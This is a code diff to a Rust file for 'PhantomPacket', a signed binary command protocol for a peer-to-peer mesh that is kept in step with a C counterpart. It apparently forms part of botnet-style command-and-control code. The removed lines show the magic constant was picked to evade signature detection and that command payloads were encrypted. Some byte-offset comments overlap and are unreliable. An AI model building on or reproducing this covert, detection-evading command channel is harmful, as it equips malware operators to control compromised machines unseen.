@@ -2,6 +2,11 @@ use serde::{Deserialize, Serialize};
 use ed25519_dalek::{Signer, Verifier, Signature, SigningKey, VerifyingKey};
 use serde_big_array::BigArray;
 
+// --- Binary Protocol Constants (Synced with C) ---
+pub const PROTOCOL_MAGIC: u32 = 0x9A1D3F7C;
+pub const PACKET_TYPE_GOSSIP: u8 = 1;
+pub const PACKET_TYPE_CMD: u8 = 2;
+
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub enum CommandType {
     Heartbeat = 0x03,
@@ -81,69 +86,62 @@ pub enum MeshMsg {
     Signal(SignalMsg),
 }
 
+// --- Binary Protocol Packet (Matches C) ---
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct PhantomPacket {
-    pub magic: u32,
-    pub timestamp: u64,
-    #[serde(with = "BigArray")]
-    pub nonce: [u8; 12],
-    pub cmd_type: CommandType,
-    pub data: Vec<u8>,
+    pub magic: u32,       // 4 bytes
+    pub ptype: u8,        // 1 byte (2 for CMD)
+    pub nonce: u32,       // 4 bytes
     #[serde(with = "BigArray")]
     pub signature: [u8; 64],
+    pub data: Vec<u8>,    // Payload
 }
 
-// Protocol constant derived from SHA256("PhantomMesh")[0..4]
-// avoids "0xDEADBEEF" signature detection.
-pub const PROTOCOL_MAGIC: u32 = 0x93A1B2C4; 
-
 impl PhantomPacket {
-    pub fn new(cmd: CommandType, data: Vec<u8>, key: &SigningKey) -> Self {
-        use rand::RngCore;
-        let mut nonce = [0u8; 12];
-        rand::thread_rng().fill_bytes(&mut nonce);
-        
+    pub fn new_cmd(nonce: u32, data: Vec<u8>, key: &SigningKey) -> Self {
         let mut packet = Self {
             magic: PROTOCOL_MAGIC,
-            timestamp: chrono::Utc::now().timestamp() as u64,
+            ptype: PACKET_TYPE_CMD,
             nonce,
-            cmd_type: cmd,
-            data,
             signature: [0u8; 64],
+            data,
         };
         packet.sign(key);
         packet
     }
 
     pub fn sign(&mut self, key: &SigningKey) {
-        let msg = self.digest();
-        let sig = key.sign(&msg);
+        // C logic: Verify(payload, sig) - Payload Only
+        let sig = key.sign(&self.data);
         self.signature = sig.to_bytes();
     }
 
     pub fn verify(&self, key: &VerifyingKey) -> bool {
         if self.magic != PROTOCOL_MAGIC { return false; }
-        let msg = self.digest();
+        // C logic: Verify(payload, sig)
         let sig_obj = Signature::from_bytes(&self.signature);
-        key.verify(&msg, &sig_obj).is_ok()
+        key.verify(&self.data, &sig_obj).is_ok()
     }
 
-    fn digest(&self) -> Vec<u8> {
-        let mut temp = self.clone();
-        temp.signature = [0u8; 64];
-        serde_json::to_vec(&temp).unwrap()
-    }
-
-    pub fn decrypt(&self, key: &[u8]) -> Option<CommandPayload> {
-        use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit};
-        use chacha20poly1305::aead::Aead;
+    /// Helper to get binary bytes for P2P transport
+    pub fn to_bytes(&self) -> Vec<u8> {
+        let mut buf = Vec::new();
+        buf.extend_from_slice(&self.magic.to_be_bytes()); // 0-3
+        buf.push(self.ptype);                             // 4
         
-        if key.len() != 32 { return None; }
-        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
-        let nonce = chacha20poly1305::Nonce::from_slice(&self.nonce);
+        // C struct: [Nonce(4)] [Sig(64)] [Len(2)] [Payload...]
+        // Note: C implementation handled Type check *before* casting struct.
+        // buffer[4] is Type.
+        // If Type == CMD (2):
+        // Offset 5 starts Nonce.
         
-        let plaintext_bytes = cipher.decrypt(nonce, self.data.as_ref()).ok()?;
-        let json = String::from_utf8(plaintext_bytes).ok()?;
-        serde_json::from_str::<CommandPayload>(&json).ok()
+        buf.extend_from_slice(&self.nonce.to_be_bytes()); // 5-8
+        buf.extend_from_slice(&self.signature);           // 9-73
+        
+        let len = self.data.len() as u16;
+        buf.extend_from_slice(&len.to_be_bytes());        // 73-75
+        
+        buf.extend_from_slice(&self.data);                // 75...
+        buf
     }
 }
